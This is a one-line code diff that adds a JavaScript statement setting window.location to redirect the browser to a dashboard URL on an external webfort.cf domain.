@@ -1,0 +1,1 @@
+window.location = 'https://www.webfort.cf/v2/dashboard/';
